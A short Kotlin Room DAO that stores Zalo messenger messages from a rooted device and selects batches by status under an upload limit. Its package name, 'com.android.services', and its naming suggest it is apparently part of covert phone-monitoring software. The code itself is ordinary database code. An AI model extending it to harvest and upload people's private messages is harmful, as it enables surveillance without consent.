package com.android.services.db.dao

import androidx.room.Dao
import androidx.room.Insert
import androidx.room.OnConflictStrategy
import androidx.room.Query
import com.android.services.db.entities.ZaloMessageRooted
import com.android.services.util.AppConstants
import java.util.*

@Dao
interface ZaloMessageRootedDao {

    @Insert(onConflict = OnConflictStrategy.IGNORE)
    fun insert(zalo_message: List<ZaloMessageRooted>)

    @Query("Select * from zalo_message_rooted where status =:status ORDER BY date DESC limit ${AppConstants.imLogsUploadLimit}")
    fun selectAllZaloMessageMessageMessages(status: Int): List<ZaloMessageRooted>

    @Query("Update zalo_message_rooted set status=:updated_status where date BETWEEN :startDate AND :endDate")
    fun update(updated_status: Int, startDate: Date, endDate: Date): Int

    @Query("select max(timeStamp) from zalo_message_rooted")
    fun selectMaxTimeStamp(): Long?
}